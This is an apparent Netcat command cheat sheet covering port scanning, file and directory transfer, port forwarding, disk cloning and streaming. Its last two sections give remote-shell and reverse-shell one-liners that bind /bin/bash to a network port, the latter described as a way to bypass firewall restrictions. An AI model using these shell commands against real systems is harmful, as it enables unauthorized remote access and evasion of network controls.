---
title: Netcat - nc
date: 2020-11-25 18:28:43
icon: icon-netcat
background: bg-blue-600
tags: 
    - ncat
categories:
    - Linux Command
intro:  This cheat sheet provides various for using Netcat on both Linux and Unix.
---

Getting started {.cols-5}
---------------

### Usage {.col-span-2}

Connect to a host located anywhere

```
nc [options] [host] [port]
```

Listen for incoming connections
```
nc -lp port [host] [port]
```

Arbitrary TCP and UDP connections and listens.



### Option examples {.col-span-3}

| Option | Description                 | Example                                            |
|--------|-----------------------------|----------------------------------------------------|
| `-h`     | nc -h                       | Help                                               |
| `-z`     | nc -z 192.168.1.100 1-100        | Port scan for a host or IP address                 |
| `-v`     | nc -zv 192.168.1.100 1-100     |   Provide verbose output   | 
| `-n`     | nc -zn 192.168.1.100 1-100     | Fast scan by disabling DNS resolution              |
| `-l`     | nc -lp 8090                 | TCP Listen mode _(for inbound connects)_                                   |
| `-w`     | nc -w 180 192.168.1.100 8090     | Define timeout value                               |
| `-k`     | nc -kl 8090 | Continue listening after disconnection |
| `-u`     | nc -u 192.168.1.100 8090 | Use UDP instead of TCP |
| `-q`     | nc -q 1 192.168.1.100 8090 | Client stay up after EOF |
| `-4`     | nc -4 -l 8090 | IPv4 only                                          |
| `-6`     | nc -6 -l 8090 | IPv6 only                                          |


Examples {.cols-3}
--------

### Banner grabbing
```
$ nc website.com 80
GET index.html HTTP/1.1
HEAD / HTTP/1.1
```
or
```
echo "" | nc -zv -wl 192.168.1.1 801-805
```

### Port scanning

Scan ports between 21 to 25
```
nc -zvn 192.168.1.1 21-25
```

Scan ports 22, 3306 and 8080
```
nc -zvn 192.168.1.1 22 3306 8080
```


### Proxy and port forwarding
```
nc -lp 8001 -c "nc 127.0.0.1 8000"
```
or
```
nc -l 8001 | nc 127.0.0.1 8000
```
Create a tunnel from one local port to another


### Chat client-server
Server (192.168.1.100)
```
nc -l 8090
```

Client
```
nc 192.168.1.100 8090
```

After this whatever you type on machine B will appear on A and vice-versa.


### Download file

Server (192.168.1.100)
```
nc -l 8090 < file.txt
```

Client
```
nc -n 192.168.1.100 8090 > file.txt
```

Suppose you want to transfer a file “file.txt” from server A to client B.


### Upload file

Server (192.168.1.100)
```
nc -l 8090 > file.txt
```

Client
```
nc 192.168.1.100 8090 < file.txt
```

Suppose you want to transfer a file “file.txt” from client B to server A:


### Directory transfer

Server (192.168.1.100)
```
tar -cvf – dir_name | nc -l 8090
```

Client
```
nc -n 192.168.1.100 8090 | tar -xvf -
```

Suppose you want to transfer a directory over the network from A to B.


### Encrypt transfer {.col-span-2}


Server (192.168.1.100)
```
nc -l 8090 | openssl enc -d -des3 -pass pass:password > file.txt
```

Client
```
openssl enc -des3 -pass pass:password | nc 192.168.1.100 8090
```

Encrypt data before transfering over the network



### Clones

Server (192.168.1.100)
```
dd if=/dev/sda | nc -l 8090
```

Client
```
nc -n 192.168.1.100 8090 | dd of=/dev/sda
```

Cloning a linux PC is very simple. Suppose your system disk is /dev/sda



### Video streaming

Server (192.168.1.100)
```
cat video.avi | nc -l 8090
```

Client
```
nc 192.168.1.100 8090 | mplayer -vo x11 -cache 3000 -
```

Streaming video with netcat




### Remote shell

Server (192.168.1.100)
```
nc -l 8090 -e /bin/bash -i
```

Client
```
nc 192.168.1.100 8090
```

We have used remote Shell using the telnet and ssh but what if they are not installed and we do not have the permission to install them, then we can create remote shell using netcat also.



### Reverse shell

Server (192.168.1.100)
```
nc -l 8090
```

Client
```
nc 192.168.1.100 8090 -e /bin/bash
```

Reverse shells are often used to bypass the firewall restrictions like blocked inbound connections

